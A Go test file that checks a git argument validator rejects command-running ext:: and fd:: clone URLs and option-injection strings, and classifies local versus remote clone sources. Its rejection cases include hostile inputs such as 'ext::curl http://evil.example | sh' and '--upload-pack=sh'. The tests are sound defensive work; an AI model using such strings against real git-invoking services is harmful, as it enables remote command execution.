package gitargv_test

import (
	"strings"
	"testing"

	"github.com/lycaon/lycaon/internal/gitargv"
)

func TestValidateCloneURLRejectsCommandExecutingTransports(t *testing.T) {
	// ext:: and fd:: run a command named in the URL. "--" does not help: they are
	// schemes, not options, so the string itself has to be refused.
	for _, url := range []string{
		"ext::sh -c 'id > /tmp/pwn'",
		"EXT::sh -c whoami",
		"  ext::curl http://evil.example | sh",
		"fd::7",
		"FD::3/foo",
	} {
		if err := gitargv.ValidateCloneURL(url); err == nil {
			t.Fatalf("ValidateCloneURL(%q) = nil, want refusal", url)
		}
	}
}

func TestValidateCloneURLRejectsOptionLookalikes(t *testing.T) {
	for _, url := range []string{"--upload-pack=sh", "-c", " --config=x"} {
		if err := gitargv.ValidateCloneURL(url); err == nil {
			t.Fatalf("ValidateCloneURL(%q) = nil, want refusal", url)
		}
	}
	if err := gitargv.ValidateCloneURL("  "); err == nil {
		t.Fatal("ValidateCloneURL(blank) = nil, want refusal")
	}
}

func TestValidateCloneURLAcceptsOrdinarySources(t *testing.T) {
	for _, url := range []string{
		"https://github.com/example/pack.git",
		"git@github.com:example/pack.git",
		"/srv/packs/local.git",
		"ssh://git@example.com/pack.git",
	} {
		if err := gitargv.ValidateCloneURL(url); err != nil {
			t.Fatalf("ValidateCloneURL(%q) = %v, want nil", url, err)
		}
	}
}

func TestValidateRefArg(t *testing.T) {
	// Empty means "default branch" and never reaches argv.
	for _, ref := range []string{"", "  ", "HEAD", "main", "v1.2.3", "9f2c1ab"} {
		if err := gitargv.ValidateRefArg(ref); err != nil {
			t.Fatalf("ValidateRefArg(%q) = %v, want nil", ref, err)
		}
	}
	for _, ref := range []string{"--upload-pack=sh", "-b", " --exec=x"} {
		err := gitargv.ValidateRefArg(ref)
		if err == nil {
			t.Fatalf("ValidateRefArg(%q) = nil, want refusal", ref)
		}
		if !strings.Contains(err.Error(), "invalid git ref") {
			t.Fatalf("ValidateRefArg(%q) error = %v", ref, err)
		}
	}
}

// The classification decides whether a fetch is racing this host's own writes,
// so a remote read as local costs a needless lease and a local read as remote
// costs the ordering the lease exists for.
func TestLocalCloneSourcePathFollowsGitsOwnReadingOfTheString(t *testing.T) {
	local := map[string]string{
		"file:///srv/packs/acme":  "/srv/packs/acme",
		"FILE:///srv/packs/acme":  "/srv/packs/acme",
		"/srv/packs/acme":         "/srv/packs/acme",
		"./packs/acme":            "./packs/acme",
		"packs/acme":              "packs/acme",
		"  /srv/packs/acme  ":     "/srv/packs/acme",
		"/srv/packs/acme:archive": "/srv/packs/acme:archive",
	}
	for source, want := range local {
		got, ok := gitargv.LocalCloneSourcePath(source)
		if !ok || got != want {
			t.Fatalf("gitargv.LocalCloneSourcePath(%q) = %q,%v want %q,true", source, got, ok, want)
		}
	}

	remote := []string{
		"https://example.invalid/acme.git",
		"http://example.invalid/acme.git",
		"git://example.invalid/acme.git",
		"ssh://git@example.invalid/acme.git",
		"git@example.invalid:owner/acme.git",
		"example.invalid:owner/acme.git",
		"ext::sh -c whoami",
		"",
		"   ",
		"--upload-pack=whoami",
		"file://",
	}
	for _, source := range remote {
		if got, ok := gitargv.LocalCloneSourcePath(source); ok {
			t.Fatalf("gitargv.LocalCloneSourcePath(%q) = %q,true want false", source, got)
		}
	}
}
